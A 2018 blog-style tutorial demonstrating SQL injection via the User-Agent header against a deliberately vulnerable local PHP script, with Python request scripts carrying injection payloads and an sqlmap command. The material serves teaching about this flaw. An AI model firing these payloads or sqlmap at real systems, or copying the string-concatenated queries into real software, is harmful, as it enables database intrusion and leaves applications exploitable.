---
layout: post
title:  "SQL Injection Through HTTP Header"
date:   2018-04-02 08:48:58 +1000
categories: hacking
---
Hello, world! In this article I am going to show you, how to exploit [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) through HTTP request header


> ###### What is SQL injection?
SQL Injection (SQLi) refers to an injection attack wherein an attacker can execute malicious SQL statements (also commonly referred to as a malicious payload) that control a web application's database server (also commonly referred to as a Relational Database Management System – RDBMS).

To demonstrate this attack, I already wrote a vulnerable `PHP` script. Which allows me to do [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) through `User-Agent`. It doesn't have to be the `User-Agent`, it could be any header in the request.

{% highlight php %}
<?php 
	
	$data = array(
		"user-agent" => $_SERVER['HTTP_USER_AGENT'],
		"ip" => $_SERVER['REMOTE_ADDR']
	);

	$link = mysqli_connect("localhost", "root", "", "suyambu");
	if (!$link) {
		echo "Error: Unable to connect to MySQL." . PHP_EOL;
		echo "Debugging errno: " . mysqli_connect_errno() . PHP_EOL;
		echo "Debugging error: " . mysqli_connect_error() . PHP_EOL;
		exit;
	}
	$get_result = mysqli_query($link, "SELECT * FROM user_agent WHERE ip='" . $data["ip"] . "' AND agent='" . $data["user-agent"] . "'");
	if (mysqli_num_rows($get_result) == 0) {
		mysqli_query($link, "INSERT INTO user_agent (ip, agent, is_active) VALUES ('" . $data["ip"] . "', '" . $data["user-agent"] . "', 1)");
	}

	mysqli_close($link);
	echo json_encode($data);

?>
{% endhighlight %}

The script is simply getting the user `IP` and `User-Agent` then storing it in the [database](https://en.wikipedia.org/wiki/Database). If you noticed there are two mistakes (**vulnerable**) in the script

**1. Unfiltered value in fetch data from database**

{% highlight php %}
$get_result = mysqli_query($link, "SELECT * FROM user_agent WHERE ip='" . $data["ip"] . "' AND agent='" . $data["user-agent"] . "'");
{% endhighlight %}

**2. Unfiltered value in storing data to database**

{% highlight php %}
mysqli_query($link, "INSERT INTO user_agent (ip, agent, is_active) VALUES ('" . $data["ip"] . "', '" . $data["user-agent"] . "', 1)");
{% endhighlight %}

## Checking Vulnerability Using Python

I am going to launch a local [Apache](https://en.wikipedia.org/wiki/Apache) server to test the vulnerability and also I am using Python to send the `HTTP` request.

> There is a [Firefox](https://www.mozilla.org/en-US/firefox/new/) browser extension call [Tamper Data](https://addons.mozilla.org/en-US/firefox/addon/tamper-data/), you can also use this extention to tamper `HTTP` request headers.

{% highlight python %}
import requests


def main():
	res = requests.get("http://192.168.43.229/user-agent/", headers={
		"User-Agent": "'"
	})

	print(res.text)


if __name__ == "__main__":
	main()
{% endhighlight %}

> I forgot to tell you, I am testing this vulnerability with `Error Base SQL Injection` in mind, if the application has `Blind SQL Injection` or any other type then you can skip this step.

If you run the script, you will see a SQL error on your response.

{% highlight html %}
<br />
<b>Warning</b>:  mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in <b>/opt/lampp/htdocs/user-agent/index.php</b> on line <b>16</b><br />
{"user-agent":"'","ip":"192.168.43.229"}
{% endhighlight %}

Now to confirm it's vulnerable, I am going to send the following payload in `User-Agent`

{% highlight python %}
import requests


def main():
	res = requests.get("http://192.168.43.229/user-agent/", headers={
		"User-Agent": "' or 1=1-- -"
	})

	print(res.text)


if __name__ == "__main__":
	main()
{% endhighlight %}

If you don't get any error then the application is vulnerable to [SQL injection](https://en.wikipedia.org/wiki/SQL_injection). Now you can exploit the server with any automated [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) tools or you can exploit it by sending self constructed queries.

# Exploit Using SQLMap

To exploit the application through `User-Agent` with [SQLMap](https://en.wikipedia.org/wiki/Sqlmap) you can use the following command.

{% highlight bash %}
$ sqlmap -u http://192.168.43.229/user-agent -p "User-Agent"
{% endhighlight %}

<img src="https://preview.ibb.co/cLABhH/Screenshot_from_2018_04_03_09_15_02.png" alt="Screenshot_from_2018_04_03_09_15_02" border="0">